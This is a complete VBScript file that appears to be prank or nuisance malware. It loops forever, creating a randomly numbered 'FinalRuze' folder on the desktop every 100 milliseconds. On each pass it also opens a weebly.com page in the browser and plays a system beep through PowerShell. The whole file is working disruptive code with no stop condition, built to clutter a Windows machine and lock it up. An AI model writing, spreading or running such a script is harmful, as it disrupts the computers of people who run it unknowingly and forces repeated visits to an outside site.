Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strDesktopPath = objShell.SpecialFolders("Desktop")

Do While True
    ' Create a new folder with a random number suffix
    Randomize
    folderName = "FinalRuze" & CStr(Int((999999-100000+1)*Rnd+100000))
    objFSO.CreateFolder strDesktopPath & "\" & folderName
    
    ' Open the website in the default browser
    objShell.Run "cmd /c start """" https://j26nabr4tcsw908qiu.weebly.com/", 0, True
    
    ' Play the system beep sound
    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
    
    ' Wait for 100 milliseconds before creating the next folder and opening the website again
    WScript.Sleep 100
Loop
